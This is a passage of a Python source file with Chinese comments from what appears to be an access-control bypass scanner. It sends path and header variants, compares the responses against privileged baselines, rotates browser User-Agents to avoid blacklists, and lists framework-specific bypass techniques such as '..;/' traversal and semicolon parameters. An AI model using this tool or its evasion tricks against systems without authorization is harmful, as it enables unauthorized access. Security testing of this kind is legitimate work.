        try:
            k.encode("latin-1")
            v.encode("latin-1")
        except UnicodeEncodeError:
            return False, "header_unicode", f"头部含非 ASCII: {k}"
        # 3) 单例头重复
        if k_lower in SINGLETON_HEADERS:
            if k_lower in seen_singletons:
                return False, "header_duplicate_unsafe", f"单例头重复: {k}"
            seen_singletons.add(k_lower)
    return True, None, None


def split_url_fields(raw_url):
    """
    正则拆分 URL 为 (scheme, netloc, raw_path, raw_query, fragment)，
    保留原始百分号编码，不做任何解码。
    返回：dict 或 None（解析失败）。
    """
    # 正则：scheme://netloc/path?query#fragment
    m = re.match(
        r"^(?P<scheme>[a-zA-Z][a-zA-Z0-9+.-]*):\/\/"
        r"(?P<netloc>[^\/?#]*)"
        r"(?P<path>[^?#]*)"
        r"(?:\?(?P<query>[^#]*))?"
        r"(?:#(?P<fragment>.*))?$",
        raw_url,
    )
    if not m:
        return None
    return {
        "scheme": m.group("scheme"),
        "netloc": m.group("netloc"),
        "raw_path": m.group("path") or "/",
        "raw_query": m.group("query") or "",
        "fragment": m.group("fragment") or "",
    }


def url_bytes_fidelity(raw_url):
    """
    检测 yarl.URL(raw_url, encoded=True) 是否改写了字节。
    返回：(ok: bool, rewritten_fields: list[str])
    比对：raw_path、raw_query_string（fragment 不发送，不比对）。
    """
    fields = split_url_fields(raw_url)
    if not fields:
        return False, ["url_invalid"]
    try:
        u = URL(raw_url, encoded=True)
    except Exception:
        return False, ["url_invalid"]

    rewritten = []
    # path
    if u.raw_path != fields["raw_path"]:
        rewritten.append("path")
    # query
    if u.raw_query_string != fields["raw_query"]:
        rewritten.append("query")

    return len(rewritten) == 0, rewritten


def classify_client_reject(exc):
    """
    分类客户端异常为 client_err 代码。
    返回：(client_err: str|None, is_network: bool)
    client_err 非空 → 客户端丢弃；is_network=True → 网络失败（保留原行为）。
    """
    exc_name = type(exc).__name__
    exc_msg = str(exc).lower()

    # 1) URL 非法（InvalidURL 是 ValueError 子类，须先判）
    if isinstance(exc, aiohttp.InvalidURL):
        return "url_invalid", False

    # 2) ValueError：aiohttp 常见拒绝
    if isinstance(exc, ValueError):
        if "newline" in exc_msg or "carriage return" in exc_msg:
            return "header_crlf", False
        if "header" in exc_msg or "invalid" in exc_msg:
            return "header_invalid", False
        if "utf-8" in exc_msg or "encode" in exc_msg:
            return "header_unicode", False
        # 兜底
        return "header_invalid", False

    # 3) 网络失败（保留原「请求失败」）
    if isinstance(exc, (aiohttp.ClientConnectorError, aiohttp.ServerDisconnectedError,
                        asyncio.TimeoutError)):
        return None, True

    # 4) 其他 ClientError
    if isinstance(exc, aiohttp.ClientError):
        return None, True

    # 未知异常，归为网络失败
    return None, True


def summary_fit(text, width=80):
    """
    单行摘要：替换 \n/\r 为空格，截断到 width。
    """
    s = text.replace("\n", " ").replace("\r", " ")
    if len(s) > width:
        s = s[:width-3] + "..."
    return s


class WireRequest:
    """
    线上请求保真快照（预留，当前 send() 未使用）。
    __slots__: method, raw_url, pairs, body, use_absolute, footer_fingerprint, notes, occupied
    """
    __slots__ = ("method", "raw_url", "pairs", "body", "use_absolute",
                 "footer_fingerprint", "notes", "occupied")

    def __init__(self, method, raw_url, pairs, body, use_absolute):
        self.method = method
        self.raw_url = raw_url
        self.pairs = pairs  # list[tuple[str,str]]
        self.body = body
        self.use_absolute = use_absolute
        self.footer_fingerprint = ""  # 响应尾指纹（预留）
        self.notes = []
        self.occupied = 0  # 字节占用（预留）


# ---------------------------------------------------------------------------
# 5.6 请求管理器（v4.5 重写：集成保真层）
# ---------------------------------------------------------------------------
class RequestManager:
    """异步请求管理器（v4.5 重写）：管理会话、限速、代理 + 客户端保真层。
    新增：
      - stats: 计数 planned/sent/responded/client_rejected/network_error/rewritten
      - send() 返回 send_status/client_err/client_detail/wire_headers/
        header_merge_notes/url_fidelity
      - skip_auto_headers 抑制 aiohttp 自动头（Accept-Encoding/UA 等不再
        覆盖测试意图；Host/POST Content-Length aiohttp 仍强制补齐）
      - 头部用 list[tuple] 承载重复值；单例头同名按 v4.4 dict.update
        「后者覆盖」语义消解（见 resolve_singleton_overrides）"""

    def __init__(self, config):
        self.low_cookie = config.get("low_cookie", "")
        self.high_cookie = config.get("high_cookie", "")
        self.extra_headers = config.get("extra_headers", {})
        self.proxy = config.get("proxy", "")
        self.timeout = config.get("timeout", 10)
        self.tls_verify = config.get("tls_verify", False)
        # v4.3 [P0-3]: UA 伪装——空串时每请求从 BROWSER_UA_POOL 随机轮换；
        # --user-agent / YAML user_agent 指定时固定使用（--header 中的 UA 仍可覆盖）
        self.user_agent = config.get("user_agent", "") or ""
        self.limiter = AsyncRateLimiter(config.get("delay", 0.2), config.get("jitter", 0.3))
        self._session = None
        # v3.8: CLI 级凭据/附加头快照——-r 请求文件的目标级上下文在此基础上覆盖
        #（见 run_target / run_fingerprint_only；顺序执行模型下安全，勿改并发共享）
        self.cli_low_cookie = self.low_cookie
        self.cli_extra_headers = dict(self.extra_headers)
        # v4.5: 发送保真统计
        self.stats = {
            "planned": 0,           # 计划发送（evaluate 调用次数）
            "sent": 0,              # 实际发出（交由 aiohttp 发送）
            "responded": 0,         # 收到响应
            "client_rejected": 0,   # 客户端丢弃
            "network_error": 0,     # 网络失败
            "rewritten": 0,         # URL 被改写
            "client_err_breakdown": Counter(),  # client_err 分布
            "rewrite_samples": [],  # 改写样本（上限 12）
        }

    def _get_headers(self, kind):
        """返回 list[tuple[str, str]]，支持重复头。kind: "low" | "high" | "anon"
        v4.3 [P0-3]: 默认 UA 不再暴露工具身份（authz-bypass-tester/x），
        无固定 UA 时逐请求随机轮换浏览器 UA，规避 UA 黑名单整轮拦截"""
        ua = self.user_agent or random.choice(BROWSER_UA_POOL)
        pairs = [("User-Agent", ua)]

        if kind == "low" and self.low_cookie:
            pairs.append(("Cookie", self.low_cookie))
        elif kind == "high" and self.high_cookie:
            pairs.append(("Cookie", self.high_cookie))

        # "anon" 不设置 Cookie；v3.8: 并剥离认证类附加头，防 -r 凭据混入匿名探测
        extra = self.extra_headers
        if kind == "anon":
            extra = {k: v for k, v in extra.items() if k.lower() not in ANON_STRIP_HEADERS}
        pairs.extend(normalize_headers(extra))

        return pairs

    async def _get_session(self):
        if self._session is None or self._session.closed:
            timeout = ClientTimeout(total=self.timeout)
            # v3.1: TLS 参数只在 connector 层传递（request 级 ssl= 在新版 aiohttp 已弃用）
            connector = aiohttp.TCPConnector(limit=0, ssl=self.tls_verify)
            self._session = aiohttp.ClientSession(
                timeout=timeout, connector=connector,
                # v3.1 [D1 修复] DummyCookieJar：禁止会话级 Cookie 持久化，
                # 凭据只走显式 Cookie 头，杜绝 Set-Cookie 污染匿名复核；
                # v4.3 [P0-3]: 会话级不再设默认 UA——UA 统一由 _get_headers 逐请求决定
                cookie_jar=aiohttp.DummyCookieJar(),
                # v4.5: 抑制 Accept-Encoding/UA 等自动注入，避免覆盖测试意图
                #（实测 Host/POST Content-Length 该版本 aiohttp 仍强制补齐）
                skip_auto_headers=AUTO_SUPPRESS_HEADERS,
            )
        return self._session

    async def send(self, url, method, extra_headers=None, kind="low", body=None, use_absolute=False):
        """v4.5 保真版 send：
          1) 头部用 list[tuple] 承载重复值
          2) URL 字段级保真检测（yarl encoded=True 基础上做字段级比对）
          3) 预检 CRLF/非法字符/单例重复
          4) 异常分类为 client_err（客户端丢弃）或 network_error（原请求失败语义）
          5) 返回新增字段：
             - send_status: "ok" | "rejected_by_client" | "network_error"
             - client_err: str | None（CLIENT_ERR_CODES 键）
             - client_detail: str（详细原因）
             - wire_headers: list[tuple]（实际发送的头）
             - header_merge_notes: list[str]（合并说明）
             - url_fidelity: dict（url_ok, rewritten_fields）
        v3.4 [P0-1]: 使用 yarl URL(encoded=True) 阻止客户端对 %XX 做 requote/
        规范化改写（旧版 %2e%2e 等编码变形会被解码回明文发送，测试面失真）；
        同时回填 sent_url / rewritten，被客户端改写的变形在报告中显式标注。
        v3.4 [G4]: use_absolute=True 时借 HTTP 代理协议语义发送 absolute-form
        请求行（仅 http:// 目标生效）。"""
        await self.limiter.wait()
        start = time.monotonic()

        # 1) 组装头部（list[tuple]）
        pairs = self._get_headers(kind)
        if extra_headers:
            # v3.8: 变形级附加头同样按 kind 过滤——匿名探测不得携带认证类头
            #（变形的 headers 含 -r 基础请求头，其中可能有 Authorization）
            extra_pairs = normalize_headers(extra_headers)
            if kind == "anon":
                extra_pairs = [(k, v) for k, v in extra_pairs if k.lower() not in ANON_STRIP_HEADERS]
            pairs.extend(extra_pairs)

        # v4.5 兼容修正：单例头同名按「后者覆盖」消解（复刻 v4.4 dict.update 语义，
        # 防 -r 基础头与变体头叠加被误判 header_duplicate_unsafe 而整轮丢弃）
        pairs = resolve_singleton_overrides(pairs)

        # 2) 合并可合并头
        pairs, merge_notes = collapse_mergeable(pairs)

        # 3) 校验头部
        hdr_ok, hdr_err, hdr_detail = validate_header_pairs(pairs)
        if not hdr_ok:
            self.stats["client_rejected"] += 1
            self.stats["client_err_breakdown"][hdr_err] += 1
            return {
                "code": -1, "length": 0, "body": "", "truncated": False,
                "location": "", "ctype": "", "server": "", "cache_status": "",
                "age": "", "headers": {}, "rtt": 0.0, "error": None,
                "sent_url": url, "rewritten": False,
                # v4.5 新增
                "send_status": "rejected_by_client",
                "client_err": hdr_err,
                "client_detail": hdr_detail,
                "wire_headers": pairs,
                "header_merge_notes": merge_notes,
                "url_fidelity": {"url_ok": True, "rewritten_fields": []},
            }

        # 4) URL 保真检测
        url_ok, rewritten_fields = url_bytes_fidelity(url)
        if not url_ok:
            self.stats["client_rejected"] += 1
            self.stats["client_err_breakdown"]["url_invalid"] += 1
            return {
                "code": -1, "length": 0, "body": "", "truncated": False,
                "location": "", "ctype": "", "server": "", "cache_status": "",
                "age": "", "headers": {}, "rtt": 0.0, "error": None,
                "sent_url": url, "rewritten": False,
                "send_status": "rejected_by_client",
                "client_err": "url_invalid",
                "client_detail": f"URL 解析失败: {url}",
                "wire_headers": pairs,
                "header_merge_notes": merge_notes,
                "url_fidelity": {"url_ok": False, "rewritten_fields": rewritten_fields},
            }
        if rewritten_fields:
            self.stats["rewritten"] += 1
            if len(self.stats["rewrite_samples"]) < 12:
                self.stats["rewrite_samples"].append(summary_fit(url, 60))

        # 5) 准备 session 和 proxy
        session = await self._get_session()
        proxy = self.proxy if self.proxy else None
        if use_absolute and not proxy and url.startswith("http://"):
            # 目标自身作为 proxy → 请求行携带完整 URL（absolute-form）
            proxy = f"{urlparse(url).scheme}://{urlparse(url).netloc}"

        # 6) body 编码
        data = None
        if body:
            try:
                data = body.encode("utf-8")
            except UnicodeEncodeError as e:
                self.stats["client_rejected"] += 1
                self.stats["client_err_breakdown"]["body_encode"] += 1
                return {
                    "code": -1, "length": 0, "body": "", "truncated": False,
                    "location": "", "ctype": "", "server": "", "cache_status": "",
                    "age": "", "headers": {}, "rtt": 0.0, "error": None,
                    "sent_url": url, "rewritten": False,
                    "send_status": "rejected_by_client",
                    "client_err": "body_encode",
                    "client_detail": str(e),
                    "wire_headers": pairs,
                    "header_merge_notes": merge_notes,
                    "url_fidelity": {"url_ok": url_ok, "rewritten_fields": rewritten_fields},
                }

        # 7) 发送请求
        try:
            req_url = URL(url, encoded=True)
            # aiohttp 接受 dict 或 CIMultiDict，这里传 dict：单例头已消解、
            # 可合并头已折叠；残留的非单例同名对按 v4.4 同名后者覆盖语义折叠
            headers_dict = {k: v for k, v in pairs}

            self.stats["sent"] += 1
            async with session.request(
                method, req_url, headers=headers_dict, data=data,
                allow_redirects=False, proxy=proxy,
            ) as r:
                body_bytes = await r.content.read(MAX_BODY_SIZE + 1)
                truncated = len(body_bytes) > MAX_BODY_SIZE
                body_text = body_bytes[:MAX_BODY_SIZE].decode("utf-8", "replace")

                err = None
                if r.status == 429:
                    await self.limiter.penalize()
                    err = "http_429"
                else:
                    await self.limiter.reward()  # v3.1: 成功后渐进恢复速率

                self.stats["responded"] += 1
                sent_url = str(r.request_info.url)
                return {
                    "code": r.status, "length": len(body_bytes),
                    "body": body_text, "truncated": truncated,
                    "location": r.headers.get("Location", ""),
                    "ctype": r.headers.get("Content-Type", ""),
                    "server": r.headers.get("Server", ""),
                    "cache_status": r.headers.get("X-Cache", r.headers.get("CF-Cache-Status", "")),
                    "age": r.headers.get("Age", ""),
                    "headers": dict(r.headers),
                    "rtt": round(time.monotonic() - start, 3), "error": err,
                    "sent_url": sent_url, "rewritten": sent_url != url,
                    # v4.5 新增
                    "send_status": "ok",
                    "client_err": None,
                    "client_detail": "",
                    "wire_headers": pairs,
                    "header_merge_notes": merge_notes,
                    "url_fidelity": {"url_ok": url_ok, "rewritten_fields": rewritten_fields},
                }

        except Exception as e:
            # 分类异常：客户端丢弃（可归因，不算网络失败）vs 网络失败（原语义）
            client_err, is_network = classify_client_reject(e)
            if client_err:
                self.stats["client_rejected"] += 1
                self.stats["client_err_breakdown"][client_err] += 1
                return {
                    "code": -1, "length": 0, "body": "", "truncated": False,
                    "location": "", "ctype": "", "server": "", "cache_status": "",
                    "age": "", "headers": {}, "rtt": round(time.monotonic() - start, 3),
                    "error": None,
                    "sent_url": url, "rewritten": False,
                    "send_status": "rejected_by_client",
                    "client_err": client_err,
                    "client_detail": str(e),
                    "wire_headers": pairs,
                    "header_merge_notes": merge_notes,
                    "url_fidelity": {"url_ok": url_ok, "rewritten_fields": rewritten_fields},
                }
            # 网络失败（v4.4 语义：error=异常名；TimeoutError 沿用 "timeout" 标签）
            self.stats["network_error"] += 1
            return {
                "code": -1, "length": 0, "body": "", "truncated": False,
                "location": "", "ctype": "", "server": "", "cache_status": "",
                "age": "", "headers": {},
                "rtt": round(time.monotonic() - start, 3),
                "error": ("timeout" if isinstance(e, asyncio.TimeoutError) else type(e).__name__),
                "sent_url": url, "rewritten": False,
                "send_status": "network_error",
                "client_err": None,
                "client_detail": str(e),
                "wire_headers": pairs,
                "header_merge_notes": merge_notes,
                "url_fidelity": {"url_ok": url_ok, "rewritten_fields": rewritten_fields},
            }

    async def close(self):
        if self._session and not self._session.closed:
            await self._session.close()


# ---------------------------------------------------------------------------
# 6. 判定逻辑（v4.5 重写：支持客户端丢弃识别 + 保真降档）
# ---------------------------------------------------------------------------
def _evaluate_core(resp, method, base_low, base_high, base_err, threshold, base_rtts=None):
    """核心判定逻辑（原 evaluate 原样保留），返回 (verdict, note, confidence)。
    verdict: '★疑似绕过' / '△需复核' / '✕请求失败' / ''
    confidence: '高' / '中' / '低' / '-'
    v4.5: 保留原逻辑不变，与外层壳 evaluate() 分离——壳负责客户端丢弃
    识别与保真标注/置信度降档，核心只做纯响应判定。"""
    if resp["error"]:
        return "✕请求失败", resp["error"], "-"

    code, base_code = resp["code"], base_low["code"]
    body_comparable = method not in NO_BODY_METHODS and resp["length"] > 0

    if base_code in OK_CODES:
        return "", "基线本就放行，跳过", "-"

    def check_2xx(from_redirect):
        """2xx 响应的统一过滤链"""
        if not body_comparable:
            return "△需复核", "状态放行但无响应体可对比", "低"

        # WAF 拦截检测（v3.1：三级指纹，泛化词需状态码佐证）
        if waf := detect_waf(resp):
            return "△需复核", f"疑似WAF拦截页({waf})", "低"

        # CDN 缓存检测
        if is_cached(resp):
            return "△需复核", "响应来自CDN缓存，可能非真实绕过", "低"

        # v3.1 [D5 修复] 截断感知：响应/基线任一被截断时，★ 命中备注标注并降置信
        truncated = resp.get("truncated") or base_low.get("truncated")
        trunc_note = "；响应体被截断(>512KB)，相似度判定可信度下降" if truncated else ""

        def star(note, conf):
            if truncated:
                note += trunc_note
                conf = downgrade_conf(conf)
            # v3.4 [P0-1] 变形失真标注：客户端改写过 URL 的命中，结论需按实际 URL 复核
            if resp.get("rewritten"):
                note += "；⚠客户端URL被重写(变形失真)，请按实际发送URL复核"
            return "★疑似绕过", note, conf

        # 1) 错误页基线对照
        if base_err and not base_err["error"] and \
                (code == base_err["code"] or base_err["code"] in OK_CODES):
            sim_e = content_similarity(resp["body"], resp["ctype"],
                                       base_err["body"], base_err["ctype"],
                                       cutoff=threshold - 0.05)
            if sim_e >= threshold:
                return "", f"与错误页基线内容相似({sim_e:.2f})，视为错误页", "-"

        # 2) 拒绝/登录提示关键字降级
        if DENY_HINT.search(visible_text(resp["body"])[:3000]):
            return "△需复核", "响应含拒绝/登录提示关键字", "低"

        # 响应头信号收集
        h_signals = header_signals(resp, base_low)

        # RTT 异常检测（v3.1：2 样本也可判定）
        rtt_sig = rtt_anomaly(resp["rtt"], base_rtts) if base_rtts else None

        # 3) 有高权限基线：内容像真数据才算实锤
        if base_high and base_high["code"] in OK_CODES:
            sim = content_similarity(resp["body"], resp["ctype"],
                                     base_high["body"], base_high["ctype"],
                                     cutoff=AUTH_SIM_THRESHOLD - 0.05)
            if sim >= AUTH_SIM_THRESHOLD:
                note = f"与高权限响应内容相似度 {sim:.2f}"
                if h_signals:
                    note += f"；头信号: {'; '.join(h_signals)}"
                return star(note, "高")
            # v3.4 [G8] 敏感字段实锤：整体相似度不足但命中高权限敏感字段
            sens = sensitive_field_overlap(base_high["body"], resp["body"])
            if sens and sens[0] >= 0.5:
                note = f"命中高权限敏感字段({sens[0]:.0%}): {', '.join(sens[1][:3])}"
                if h_signals:
                    note += f"；头信号: {'; '.join(h_signals)}"
                return star(note, "高")
            if from_redirect:
                return "△需复核", f"与高权限响应内容相似度仅 {sim:.2f}", "低"

        # 4) 302 基线且无高权限对照——最高只给 △
        if from_redirect:
            return "△需复核", "基线为跳转且无高权限对照，2xx 需人工确认", "低"

        # 5) 低权限基线对比
        sim_base = content_similarity(resp["body"], resp["ctype"],
                                      base_low["body"], base_low["ctype"],
                                      cutoff=threshold - 0.05)
        if sim_base < threshold:
            note = f"与基线内容相似度仅 {sim_base:.2f}"
            if h_signals:
                note += f"；头信号: {'; '.join(h_signals)}"
            if rtt_sig:
                note += f"；{rtt_sig}"
            return star(note, "中")
        return "", "响应与基线内容相似，视为未绕过", "-"

    # ---- 基线被拒（401/403/405）----
    if base_code in DENY_LIKE:
        if code in OK_CODES:
            return check_2xx(False)
        if code in REDIRECT_CODES:
            if is_login_redirect(resp["location"]):
                return "", "重定向到登录页，未绕过", "-"
            return "△需复核", f"重定向到 {resp['location'] or '(无Location)'}", "低"
        # v3.4 [G6] 状态迁移信号：403→404/405/400 等说明请求已被路由层按
        # 不同语义解析（路径规范化/编码差异确实存在），是跟进构造的强线索
        if code in (400, 404, 405, 410) and code != base_code:
            return "△需复核", f"状态迁移 {base_code}→{code}，路由层解析语义已变化，建议跟进构造", "低"
        return "", "", "-"

    # ---- 基线为重定向（未登录跳登录页）----
    if base_code in REDIRECT_CODES:
        if code in OK_CODES:
            return check_2xx(True)
        if code in REDIRECT_CODES:
            loc = resp["location"]
            if loc and loc != base_low["location"] and not is_login_redirect(loc):
                return "△需复核", f"重定向目标不同: {loc}", "低"
        return "", "", "-"

    return "", f"基线状态 {base_code} 未覆盖，跳过", "-"


def evaluate(resp, method, base_low, base_high, base_err, threshold, base_rtts=None):
    """
    v4.5 外层壳：优先识别「客户端丢弃」，追加保真标注。
    返回 (verdict, note, confidence)。
    """
    # 1) 优先处理客户端丢弃
    if resp.get("send_status") == "rejected_by_client":
        client_err = resp.get("client_err", "unknown")
        detail = resp.get("client_detail", "")
        err_desc = CLIENT_ERR_CODES.get(client_err, "未知原因")
        return "✕客户端丢弃", f"[{client_err}] {err_desc}: {summary_fit(detail, 50)}", "-"

    # 2) 调用核心逻辑
    verdict, note, confidence = _evaluate_core(resp, method, base_low, base_high, base_err,
                                               threshold, base_rtts)

    # 3) 追加保真标注（★ 和 △ 时）
    if verdict in ("★疑似绕过", "△需复核"):
        # URL 改写
        url_fidelity = resp.get("url_fidelity", {})
        if not url_fidelity.get("url_ok", True):
            note += " ⚠URL被客户端改写（字段级保真检测失败）"
            if confidence == "高":
                confidence = "中"  # 降档
        elif url_fidelity.get("rewritten_fields"):
            fields = ", ".join(url_fidelity["rewritten_fields"])
            note += f" ⚠URL被客户端改写({fields})"
            if confidence == "高":
                confidence = "中"

        # 头部合并
        merge_notes = resp.get("header_merge_notes", [])
        if merge_notes:
            note += f" ⚠header 合并: {'; '.join(merge_notes[:2])}"  # 最多显示 2 条
            if confidence == "高":
                confidence = "中"

        # 响应截断（原有逻辑已在 _evaluate_core 中处理，这里只补充标注）
        if resp.get("truncated"):
            if "响应体被截断" not in note:
                note += " ⚠响应已截断(>512KB)"

    return verdict, note, confidence


# ---------------------------------------------------------------------------
# 6.1 保真统计与退出码调整（v4.5 新增）
# ---------------------------------------------------------------------------
def print_send_accounting(manager):
    """
    打印 RequestManager.stats 统计摘要。
    """
    s = manager.stats
    print(f"\n{c_head('═══ 发送统计 ═══')}")
    print(f"  计划: {s['planned']}  实发: {s['sent']}  响应: {s['responded']}")
    print(f"  客户端丢弃: {s['client_rejected']}  网络失败: {s['network_error']}  URL改写: {s['rewritten']}")

    if s["client_rejected"] > 0:
        print(f"\n  {c_warn('客户端丢弃分布')}:")
        for err, cnt in s["client_err_breakdown"].most_common(8):
            desc = CLIENT_ERR_CODES.get(err, err)
            print(f"    {err:24s} {cnt:4d}  ({desc})")

    if s["rewrite_samples"]:
        print(f"\n  {c_warn('URL改写样本')} (前 {len(s['rewrite_samples'])} 条):")
        for sample in s["rewrite_samples"][:8]:
            print(f"    {sample}")

    # 覆盖完整度评估
    coverage_ok = s["client_rejected"] == 0 and s["rewritten"] == 0
    if coverage_ok:
        print(f"\n  {c_ok('✓ 所有变体均成功发送，无客户端丢弃或改写')}")
    else:
        print(f"\n  {c_bad('✗ 存在客户端丢弃或改写，探测覆盖不全')}")


def fidelity_exit_adjust(manager, exit_code):
    """
    根据保真统计调整退出码。
    约定：
      0 = 干净（无绕过）
      1 = 发现绕过
      2 = 结果不可信（探测覆盖不全：存在客户端丢弃或改写）
    返回：调整后的退出码。
    """
    s = manager.stats
    if exit_code == 0 and (s["client_rejected"] > 0 or s["rewritten"] > 0):
        # 未发现绕过，但覆盖不全 → 退出码 2
        return 2
    return exit_code


# ---------------------------------------------------------------------------
# 7. 二次复核（异步版）
# ---------------------------------------------------------------------------
async def second_verify(row, base_high, manager):
    """对 ★ 命中重测：匿名 1 次 + 低权限 2 次（连同首发共 3 次），返回 (结论, 置信度)。
    v3.2: follow 类命中（重定向链升级的 ★）会自动追踪跳转链取最终落点判定，
    避免把"跳转后放行"的真实绕过误降级为复现失败。"""
    v = row["variant"]
    follow = bool(v.get("follow")) or bool(row.get("verify_follow"))
    ok = lambda r: r and not r["error"] and r["code"] in OK_CODES and r["length"] > 0

    async def fetch(kind):
        r = await manager.send(v["url"], v["method"], v["headers"], kind=kind, body=v.get("body"),
                               use_absolute=bool(v.get("use_absolute")))
        if follow and not r["error"] and r["code"] in REDIRECT_CODES and r["location"]:
            chain = await trace_redirect_chain(manager, v["url"], v["method"], v["headers"],
                                               kind=kind, body=v.get("body"),
                                               use_absolute=bool(v.get("use_absolute")))
            return chain[-1]["resp"]
        return r

    anon = await fetch("anon")
    if ok(anon):
        if base_high and base_high["code"] in OK_CODES and \
                content_similarity(anon["body"], anon["ctype"],
                                   base_high["body"], base_high["ctype"]) >= AUTH_SIM_THRESHOLD:
            return "已复核：匿名即可访问且与高权限响应一致，属于未授权访问", "高"
        if content_similarity(anon["body"], anon["ctype"],
                              row["resp"]["body"], row["resp"]["ctype"]) >= AUTH_SIM_THRESHOLD:
            return "已复核：匿名即可访问，属于未授权访问", "高"

    again1 = await fetch("low")
    again2 = await fetch("low")
    if ok(again1) and ok(again2):
        s1 = content_similarity(again1["body"], again1["ctype"], row["resp"]["body"], row["resp"]["ctype"])
        s2 = content_similarity(again2["body"], again2["ctype"], row["resp"]["body"], row["resp"]["ctype"])
        if s1 >= 0.80 and s2 >= 0.80:
            return "已复核：低权限会话连续 3 次稳定复现", row.get("confidence") or "中"
    return "复测未复现，疑似偶发或动态内容，请人工确认", "低"


# ---------------------------------------------------------------------------
# 8. 基线建立（自适应采样）
# ---------------------------------------------------------------------------
async def get_baseline_adaptive(target, manager, kind, label, max_samples=5,
                                method="GET", body=None):
    """自适应采样——前 2 次相似度 >= 0.98 即稳定返回，否则追加采样，最多 5 次。
    v3.8: method/body——基线按基础请求重放（POST 目标以 POST+原体采样，
    保证变形与基线的唯一差异收敛为路径本身）"""
    samples = []
    rtts = []
    for i in range(max_samples):
        r = await manager.send(target, method, kind=kind, body=body)
        if r["error"]:
            print(c_rev(f"    {label}: 请求失败({r['error']})，后续判定可能不准"))
            return r, False, [], rtts
        samples.append(r)
        rtts.append(r["rtt"])
        if len(samples) >= 2:
            min_sim = min(similarity(samples[i]["body"], samples[j]["body"])
                          for i in range(len(samples)) for j in range(i + 1, len(samples)))
            if min_sim >= 0.98:
                print(c_ok(f"    {label}: HTTP {r['code']}, 长度 {r['length']} (采样 {len(samples)} 次即稳定)"))
                return r, True, samples, rtts

    # 不稳定，取中位数代表
    samples_sorted = sorted(samples, key=lambda s: s["length"])
    median = samples_sorted[len(samples_sorted) // 2]
    print(c_rev(f"    {label}: HTTP {median['code']}, 长度 {median['length']}"
                + f"  ⚠ {max_samples}次采样内容不一致，相似度判定可能不准"))
    return median, False, samples, rtts


async def get_error_baseline(prefix, manager, method="GET", body=None):
    """请求不存在的路径，拿错误页指纹。
    v3.8: method/body——按基础方法采样（POST 接口的错误页/405 语义与 GET
    不同，同方法采样才能正确过滤"伪 2xx"）"""
    bogus = f"{prefix}/wb-nope-{int(time.time())}{random.randint(1000, 9999)}"
    r1 = await manager.send(bogus, method, kind="low", body=body)
    if r1["error"]:
        return None, r1["error"]
    r2 = await manager.send(bogus + "b", method, kind="low", body=body)
    if r2["error"]:
        return None, r2["error"]
    stable = similarity(r1["body"], r2["body"]) >= 0.90 and r1["code"] == r2["code"]
    if not stable:
        return None, f"两次错误页采样不一致({r1['code']}/{r2['code']})"
    return r1, None


# ---------------------------------------------------------------------------
# 9. 命中项归因聚类
# ---------------------------------------------------------------------------
def cluster_hits(hits):
    """将命中项按响应指纹聚类，减少同根因重复报告。
    v3.1 修复：哈希前先用 fingerprint() 归一化动态字段（token/时间戳/UUID），
    避免动态内容导致同根因变形哈希不同、聚类失效。"""
    clusters = {}
    for hit in hits:
        key = (hit["resp"]["code"], sha16(fingerprint(hit["resp"]["body"])))
        clusters.setdefault(key, []).append(hit)

    result = []
    for key, group in clusters.items():
        if len(group) > 1:
            for h in group[1:]:
                h["same_root"] = [g["variant"]["desc"] for g in group if g != h]
        result.append({
            "representative": group[0],
            "same_root": [h["variant"]["desc"] for h in group[1:]],
            "count": len(group),
        })
    result.sort(key=lambda x: x["count"], reverse=True)
    return result


# ---------------------------------------------------------------------------
# 9.5 v3.2 框架指纹识别 / HTTP 方法矩阵 / 多级重定向链分析
# ---------------------------------------------------------------------------
# (名称, 响应头正则, 正文正则, 证据说明, 推荐类别, 差异说明)
FRAMEWORK_SIGNATURES = [
    ("Apache Tomcat",
     re.compile(r"(?i)apache[- ]tomcat|coyote|jboss-web"),
     re.compile(r"(?i)apache tomcat[/ ]\d"),
     "Server/错误页", ["分号参数", "..;/ 穿越", "借道前缀", "目录穿越", "编码解码", "分号后缀"],
     "Tomcat 路由前会裁剪分号后的矩阵参数并解码部分编码，与 Shiro/Spring Security 的 Ant 匹配存在差异"),
    ("Jetty",
     re.compile(r"(?i)\bjetty(/|\s|\()?\d"), None,
     "Server头", ["分号参数", "路径规范化", "编码解码", "分号后缀"],
     "Jetty 同样裁剪矩阵参数，但对 //、编码斜杠的处理与前置规则层可能不一致"),
    ("Undertow/WildFly",
     re.compile(r"(?i)undertow|wildfly"),
     re.compile(r"(?i)undertow|jboss|resteasy"),
     "Server/错误页", ["路径规范化", "编码解码", "尾缀差异", "分号参数", "分号后缀"],
     "Undertow 对 URL 编码与 // 的规范化与鉴权层读取的原始 URI 易出现偏差"),
    ("Spring Boot",
     None,
     re.compile(r"(?i)whitelabel error page|no explicit mapping for /"),
     "错误页", ["尾缀差异", "路径规范化", "编码解码", "HTTP方法"],
     "Spring MVC 尾斜杠/矩阵参数匹配行为随 PathPatternParser 与 AntPathMatcher 版本差异大"),
    ("Spring (MVC/Security)",
     re.compile(r"(?i)x-application-context"),
     re.compile(r"(?i)spring(\s|-)?(mvc|security|web)"),
     "响应头/正文", ["尾缀差异", "分号参数", "路径规范化", "HTTP方法", "分号后缀"],
     "Spring Security 规则匹配的是规范化前的 URI，而路由层可能解析出不同资源"),
    ("Apache Shiro",
     re.compile(r"(?i)rememberme="),
     None,
     "Set-Cookie", ["..;/ 穿越", "借道前缀", "分号参数", "目录穿越", "编码解码", "分号后缀"],
     "Shiro 的 AntPathMatcher 与容器规范化差异是 ..;/、%3b、大小写类绕过的根源"),
    ("Jersey/JAX-RS",
     re.compile(r"(?i)jersey"),
     re.compile(r"(?i)jersey|jax-rs"),
     "响应头/正文", ["路径规范化", "尾缀差异", "编码解码"],
     "JAX-RS 实现对编码斜杠与尾斜杠的解析与前置过滤器常不一致"),
    ("RESTEasy",
     None,
     re.compile(r"(?i)resteasy"),
     "正文", ["分号参数", "路径规范化"],
     "RESTEasy 部分配置下矩阵参数参与匹配，与网关规则不一致"),
    ("Quarkus",
     re.compile(r"(?i)quarkus"),
     re.compile(r"(?i)quarkus"),
     "响应头/正文", ["路径规范化", "编码解码", "尾缀差异"],
     "Quarkus(RESTEasy Reactive) 对 // 与编码路径的规范化行为有过多次调整"),
    ("Keycloak",
     re.compile(r"(?i)keycloak|/realms/"),
     None,
     "Set-Cookie/Location", ["路径规范化", "尾缀差异", "请求头重写"],
     "Keycloak 网关与认证服务的路径匹配差异，关注 admin 路径规范化与改写头"),
    ("Nginx (反代)",
     re.compile(r"(?i)\bnginx\b"),
     None,
     "Server头", ["Nginx", "编码解码", "路径规范化", "请求头重写"],
